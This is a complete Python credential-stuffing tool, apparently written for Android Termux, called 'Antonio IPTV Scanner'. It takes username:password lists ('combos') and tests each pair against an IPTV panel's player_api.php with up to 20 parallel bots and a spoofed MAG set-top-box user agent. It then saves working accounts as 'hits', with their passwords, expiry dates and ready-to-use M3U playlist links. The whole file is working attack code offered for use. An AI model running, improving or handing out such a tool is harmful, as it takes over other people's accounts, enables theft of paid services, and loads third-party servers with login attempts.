# ============================================================
# PROYECTO: ANTONIO IPTV SCANNER
# DESCRIPCION: Scaner servidores iptv
# AUTOR: Antonio 🇵🇪 6513
# VERSION: 1.0.0
# FECHA: 2026
# PLATAFORMAS: Android - Termux - QPython
# ============================================================
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# --------------------------------------------------------------------
# FS-SCAN_IPTV
# Generado BY Antonio🇵🇪6513
# ---
"""
══════════════════════════════════════════
  📡 ANTONIO IPTV SCANNER
       "Querer es poder" 💪
══════════════════════════════════════════
"""

import os
import sys
import re
import json
import time
import datetime
import threading
import subprocess
from pathlib import Path
from collections import deque

# ─────────────────────────────────────────────
#  DEPENDENCIAS
# ─────────────────────────────────────────────
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("📦 Instalando 'requests'...")
    subprocess.run([sys.executable, "-m", "pip", "install", "requests", "-q"])
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ─────────────────────────────────────────────
#  CONFIGURACIÓN
# ─────────────────────────────────────────────
CARPETA_COMBOS   = "/sdcard/combo/"
CARPETA_HITS     = "/storage/emulated/0/Hits/"
TIMEOUT          = 12
MAX_REINTENTOS   = 2
MAX_BOTS         = 20
NOMBRE_ARCHIVO   = "Antonio_IPTV_Hits"
VIBRAR_HIT       = True
MAX_HITS_VIS     = 5
MAX_BOTS_VIS     = 5
BARRA_BLOQUES    = 22
INTERVALO_RENDER = 1.0

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
N = "\033[1m"
X = "\033[0m"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 "
                  "(KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
    "X-User-Agent": "Model: MAG254; Link: Ethernet",
    "Accept": "application/json,application/javascript,text/javascript,*/*;q=0.1",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "Keep-Alive",
    "Cookie": "stb_lang=en; timezone=America%2FToronto;",
}

# ─────────────────────────────────────────────
#  ESTADO GLOBAL
# ─────────────────────────────────────────────
_lock           = threading.Lock()
render_lock     = threading.Lock()
hits_totales    = 0
procesados      = 0
total_lineas    = 0
hora_inicio     = time.time()
panel_global    = ""
archivo_hits    = ""
bots_estado     = {}
ultimos_hits    = deque(maxlen=MAX_HITS_VIS)
detener_render  = False

BANNER = C + N + """
╔════════════════════════════════════════╗
║                                        ║
║     ▄▀█ █▄░█ ▀█▀ █▀█ █▄░█ █ █▀█        ║
║     █▀█ █░▀█ ░█░ █▄█ █░▀█ █ █▄█        ║
║                                        ║
║            📡  IPTV SCANNER  📡        ║
║                                        ║
║           "Querer es poder"  💪        ║
║                                        ║
╚════════════════════════════════════════╝
""" + X


# ─────────────────────────────────────────────
#  UTILIDADES
# ─────────────────────────────────────────────
def limpiar():
    os.system('clear' if os.name != 'nt' else 'cls')


def pedir_entero(msg, minimo, maximo):
    while True:
        try:
            v = int(input(msg).strip())
            if minimo <= v <= maximo:
                return v
            print(R + "⚠️  Debe estar entre " + str(minimo) + " y " + str(maximo) + X)
        except ValueError:
            print(R + "⚠️  Introduce un número válido" + X)


def vibrar():
    if not VIBRAR_HIT:
        return
    try:
        subprocess.run(["termux-vibrate", "-d", "250"],
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL,
                       timeout=2)
    except Exception:
        pass


def guardar_hit(contenido):
    Path(CARPETA_HITS).mkdir(parents=True, exist_ok=True)
    with open(archivo_hits, "a", encoding="utf-8") as f:
        f.write(contenido)
        f.flush()
        try:
            os.fsync(f.fileno())
        except Exception:
            pass


# ─────────────────────────────────────────────
#  MENÚS
# ─────────────────────────────────────────────
def listar_combos():
    if not os.path.isdir(CARPETA_COMBOS):
        print(R + "❌ No existe " + CARPETA_COMBOS + X)
        print(Y + "💡 Créala con: mkdir -p " + CARPETA_COMBOS + X)
        sys.exit(1)
    archivos = sorted([f for f in os.listdir(CARPETA_COMBOS)
                       if os.path.isfile(os.path.join(CARPETA_COMBOS, f))])
    if not archivos:
        print(R + "❌ No hay archivos en " + CARPETA_COMBOS + X)
        sys.exit(1)
    return archivos


def seleccionar_combo(archivos):
    print("\n" + Y + N + "  ╔════════════════════════════════════╗")
    print(        "  ║      📂 SELECCIONE SU COMBO        ║")
    print(        "  ╚════════════════════════════════════╝" + X)
    for i, a in enumerate(archivos, 1):
        print("   " + C + str(i).rjust(2) + ")" + X + " " + a)
    op = pedir_entero("\n" + G + "  👉 Seleccione número: " + X, 1, len(archivos))
    return os.path.join(CARPETA_COMBOS, archivos[op - 1])


def pedir_panel():
    print("\n" + Y + N + "  ╔════════════════════════════════════╗")
    print(        "  ║   🌐 SERVIDOR IPTV (host:puerto)   ║")
    print(        "  ╚════════════════════════════════════╝" + X)
    print("  " + W + "Ejemplo: midominio.com:8080" + X)
    while True:
        p = input("\n" + G + "  👉 URL: " + X).strip()
        p = p.replace("http://", "").replace("https://", "")
        p = p.replace("/c", "").replace("/", "").strip()
        if ":" in p and p:
            return p
        print(R + "⚠️  Formato inválido. Debe ser host:puerto" + X)


# ─────────────────────────────────────────────
#  LECTURA DE COMBO
# ─────────────────────────────────────────────
PATRON_CRED = re.compile(r"^\s*([^\s:]+)\s*:\s*([^\s:]+)\s*$")


def cargar_combo(ruta):
    with open(ruta, "r", encoding="utf-8", errors="ignore") as f:
        lineas = f.readlines()
    creds = []
    for linea in lineas:
        m = PATRON_CRED.match(linea)
        if m:
            creds.append((m.group(1), m.group(2)))
    return creds


# ─────────────────────────────────────────────
#  CONSULTA AL PANEL
# ─────────────────────────────────────────────
def consultar_panel(panel, user, password):
    url = "http://" + panel + "/player_api.php?username=" + user + "&password=" + password
    for _ in range(MAX_REINTENTOS):
        try:
            r = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if r.status_code != 200:
                return None
            texto = r.text.strip()
            if not texto or "username" not in texto:
                return None
            try:
                data = json.loads(texto)
            except json.JSONDecodeError:
                return None

            info = data.get("user_info", {})
            srv  = data.get("server_info", {})

            if info.get("auth", 0) != 1:
                return None
            if str(info.get("status", "")).lower() != "active":
                return None

            exp = info.get("exp_date")
            if exp in (None, "null", "", 0):
                exp_txt = "Ilimitado"
            else:
                try:
                    exp_txt = datetime.datetime.fromtimestamp(int(exp)).strftime("%d-%m-%Y")
                except Exception:
                    exp_txt = str(exp)

            created = info.get("created_at")
            if created in (None, "null", "", 0):
                created_txt = "-"
            else:
                try:
                    created_txt = datetime.datetime.fromtimestamp(int(created)).strftime("%d-%m-%Y %H:%M")
                except Exception:
                    created_txt = str(created)

            return {
                "user":     str(info.get("username", user)),
                "pass":     str(info.get("password", password)),
                "status":   str(info.get("status", "-")),
                "exp":      exp_txt,
                "created":  created_txt,
                "act_cons": str(info.get("active_cons", "0")),
                "max_cons": str(info.get("max_connections", "0")),
                "is_trial": str(info.get("is_trial", "0")),
                "timezone": str(srv.get("timezone", "-")),
                "url":      str(srv.get("url", "-")),
                "port":     str(srv.get("port", "-")),
            }
        except requests.exceptions.Timeout:
            continue
        except Exception:
            continue
    return None


def obtener_estadisticas(panel, user, password):
    stats = {"canales": 0, "vod": 0, "series": 0}
    endpoints = [
        ("get_live_streams", "stream_id", "canales"),
        ("get_vod_streams",  "stream_id", "vod"),
        ("get_series",       "series_id", "series"),
    ]
    for action, key, nombre in endpoints:
        try:
            url = ("http://" + panel + "/player_api.php?"
                   "username=" + user + "&password=" + password + "&action=" + action)
            r = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if r.status_code == 200:
                stats[nombre] = r.text.count(key)
        except Exception:
            pass
    return stats


# ─────────────────────────────────────────────
#  FORMATEO DE HIT (para archivo) — CON EMOJIS
# ─────────────────────────────────────────────
def formatear_hit_archivo(panel, info, stats=None, numero=0):
    user = info["user"]
    pas  = info["pass"]
    m3u  = ("http://" + panel + "/get.php?username=" + user +
            "&password=" + pas + "&type=m3u_plus")
    fecha = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    es_prueba = "SI" if info["is_trial"] == "1" else "NO"

    sep  = "=" * 46
    sep2 = "─" * 46

    txt = "\n"
    txt += sep2 + "\n"
    txt += "  ★ ANTONIO IPTV - HIT #" + str(numero) + " ★\n"
    txt += sep2 + "\n"
    txt += "\n"
    txt += "  🕐 Fecha        : " + fecha + "\n"
    txt += "  🌐 Host         : " + panel + "\n"
    txt += "  🎯 URL Real     : " + str(info["url"]) + "\n"
    txt += "  👤 Usuario      : " + user + "\n"
    txt += "  🔑 Contraseña   : " + pas + "\n"
    txt += "  ✅ Estado       : " + info["status"].upper() + "\n"
    txt += "  📅 Expiración   : " + str(info["exp"]) + "\n"
    txt += "  🗓️  Creada       : " + str(info["created"]) + "\n"
    txt += "  🔌 Conexiones   : " + str(info["act_cons"]) + " / " + str(info["max_cons"]) + "\n"
    txt += "  🌍 Zona horaria : " + str(info["timezone"]) + "\n"
    txt += "  🧪 Es prueba    : " + es_prueba + "\n"

    if stats:
        txt += "  📺 Canales      : " + str(stats["canales"]) + "\n"
        txt += "  🎬 Películas    : " + str(stats["vod"]) + "\n"
        txt += "  📼 Series       : " + str(stats["series"]) + "\n"

    txt += "  📡 M3U URL:\n"
    txt += "\n"
    txt += "  " + m3u + "\n"
    txt += "\n"
    txt += sep + "\n"
    txt += "\n\n"
    return txt


# ─────────────────────────────────────────────
#  CONSTRUCCIÓN DEL PANEL
# ─────────────────────────────────────────────
def construir_panel():
    with _lock:
        transcurrido = time.time() - hora_inicio
        p = procesados
        t = total_lineas
        h = hits_totales
        bots_snap = sorted(bots_estado.items(), key=lambda kv: -kv[1]["ts"])[:MAX_BOTS_VIS]
        hits_snap = list(ultimos_hits)

    pct = p * 100 / max(1, t)
    tasa = p / max(1, transcurrido)
    restante = (t - p) / tasa if tasa > 0 else 0

    llenos = int(BARRA_BLOQUES * pct / 100)
    barra = "█" * llenos + "░" * (BARRA_BLOQUES - llenos)

    eta_h = int(restante // 3600)
    eta_m = int((restante % 3600) // 60)
    eta_s = int(restante % 60)

    panel_corto = panel_global[:24]

    L = []
    L.append("")
    L.append(C + N + "   📡 ANTONIO IPTV SCANNER" + X)
    L.append(C + '     "Querer es poder" 💪' + X)
    L.append("")
    L.append(W + "  🌐 Panel : " + X + C + panel_corto + X)
    L.append(W + "  👥 Total : " + X + C + "{:,}".format(t) + X)
    L.append(W + "  📁 Hits  : " + X + Y + CARPETA_HITS + X)
    L.append("")
    L.append(N + Y + "  PROGRESO GENERAL" + X)
    L.append("  " + G + "[" + barra + "]" + X + " {:.2f}%".format(pct))
    L.append(W + "  ⏳ ETA : " + X + C +
             "{:02d}:{:02d}:{:02d}".format(eta_h, eta_m, eta_s) + X)
    L.append(W + "  💎 Hits: " + X + G + str(h) + X +
             W + "    ⚡ Vel: " + X + C + "{:.2f}/s".format(tasa) + X)
    L.append(W + "  ✅ Proc: " + X + C + "{:,}".format(p) + X)
    L.append("")
    L.append(N + C + "  🤖 ACTIVIDAD RECIENTE" + X)

    for i in range(MAX_BOTS_VIS):
        if i < len(bots_snap):
            bid, ib = bots_snap[i]
            user_b = ib["user"][:16]
            L.append(
                C + "  Bot-{:02d}".format(bid) + X +
                " | " + "{:>6}".format(ib["num"]) +
                " | " + W + "{:<16}".format(user_b) + X
            )
        else:
            L.append("")

    L.append("")
    L.append(N + G + "  ✅ ULTIMOS HITS" + X)

    for i in range(MAX_HITS_VIS):
        if i < len(hits_snap):
            hit = hits_snap[i]
            u = str(hit.get("user", ""))[:13]
            pw = str(hit.get("pass", ""))[:13]
            L.append(
                G + "  #{:<3}".format(hit["n"]) + X +
                W + u + ":" + pw + X
            )
        else:
            L.append("")

    L.append("")
    return L


def dibujar_panel():
    if not render_lock.acquire(blocking=False):
        return
    try:
        lineas = construir_panel()
        sys.stdout.write("\033[H\033[J")
        sys.stdout.write("\n".join(lineas))
        sys.stdout.write("\n")
        sys.stdout.flush()
    finally:
        render_lock.release()


# ─────────────────────────────────────────────
#  WORKER
# ─────────────────────────────────────────────
def worker(id_bot, credenciales, rango):
    global hits_totales, procesados

    for idx in rango:
        user, pas = credenciales[idx]

        with _lock:
            procesados += 1
            bots_estado[id_bot] = {
                "num":  procesados,
                "user": user,
                "ts":   time.time(),
            }

        info = consultar_panel(panel_global, user, pas)
        if not info:
            continue

        stats = obtener_estadisticas(panel_global, user, pas)

        with _lock:
            hits_totales += 1
            numero = hits_totales
            texto = formatear_hit_archivo(panel_global, info, stats, numero)
            guardar_hit(texto)
            ultimos_hits.appendleft({
                "n":    numero,
                "user": user,
                "pass": pas,
            })

        vibrar()
        time.sleep(0.05)


# ─────────────────────────────────────────────
#  BUCLE DE RENDER
# ─────────────────────────────────────────────
def bucle_render():
    while not detener_render:
        try:
            dibujar_panel()
        except Exception:
            pass
        time.sleep(INTERVALO_RENDER)


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def main():
    global total_lineas, panel_global, archivo_hits, detener_render

    limpiar()
    print(BANNER)

    archivos = listar_combos()
    combo_path = seleccionar_combo(archivos)

    panel_global = pedir_panel()

    print("\n" + Y + "  ⚙️  Bots paralelos (1-" + str(MAX_BOTS) + ")" + X)
    print("  " + W + "Más bots = más rápido, más carga al panel." + X)
    bots = pedir_entero("\n" + G + "  👉 Bots: " + X, 1, MAX_BOTS)

    print("\n" + C + "  📦 Cargando combo..." + X)
    credenciales = cargar_combo(combo_path)
    if not credenciales:
        print(R + "❌ No se encontraron credenciales válidas." + X)
        sys.exit(1)

    total_lineas = len(credenciales)

    Path(CARPETA_HITS).mkdir(parents=True, exist_ok=True)
    nombre_seguro = re.sub(r'[^a-zA-Z0-9_.-]', '_', panel_global)
    sello = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    archivo_hits = os.path.join(
        CARPETA_HITS,
        NOMBRE_ARCHIVO + "_" + nombre_seguro + "_" + sello + ".txt"
    )

    print("\n" + N + Y + "  ╔════════════════════════════════════╗")
    print(        "  ║       📋 RESUMEN DEL ESCANEO       ║")
    print(        "  ╚════════════════════════════════════╝" + X)
    print("  " + W + "🌐 Panel     :" + X + " " + C + panel_global + X)
    print("  " + W + "📂 Combo     :" + X + " " + C + os.path.basename(combo_path) + X)
    print("  " + W + "👥 Cuentas   :" + X + " " + C + "{:,}".format(total_lineas) + X)
    print("  " + W + "🤖 Bots      :" + X + " " + C + str(bots) + X)
    print("  " + W + "📁 Archivo   :" + X)
    print("     " + Y + os.path.basename(archivo_hits) + X)
    print()

    input(G + "  ▶️  Presiona ENTER para comenzar..." + X)

    limpiar()

    threading.Thread(target=bucle_render, daemon=True).start()

    lotes = [[] for _ in range(bots)]
    for i, _ in enumerate(credenciales):
        lotes[i % bots].append(i)

    hilos = []
    for i in range(bots):
        if not lotes[i]:
            continue
        t = threading.Thread(
            target=worker,
            args=(i + 1, credenciales, lotes[i]),
            daemon=True
        )
        hilos.append(t)
        t.start()

    try:
        for t in hilos:
            t.join()
    except KeyboardInterrupt:
        detener_render = True
        print("\n" + R + "⚠️  Interrumpido por el usuario" + X)

    detener_render = True
    time.sleep(INTERVALO_RENDER + 0.2)

    transcurrido = time.time() - hora_inicio
    th = int(transcurrido // 3600)
    tm = int((transcurrido % 3600) // 60)
    ts = int(transcurrido % 60)

    limpiar()
    print("\n" + N + G + "  ╔════════════════════════════════════╗")
    print(        "  ║      🎉 ESCANEO FINALIZADO 🎉      ║")
    print(        "  ╚════════════════════════════════════╝" + X)
    print()
    print("  " + W + "💎 Hits encontrados :" + X + " " + G + str(hits_totales) + X)
    print("  " + W + "📊 Total procesados :" + X + " " + C + "{:,}".format(procesados) + X)
    print("  " + W + "⏱  Tiempo total     :" + X + " " + C +
          "{:02d}:{:02d}:{:02d}".format(th, tm, ts) + X)
    print("  " + W + "📁 Archivo de hits  :" + X)
    print("     " + Y + archivo_hits + X)
    print()
    print(C + N + '  "Querer es poder"  💪' + X)
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + R + "⚠️  Cancelado." + X)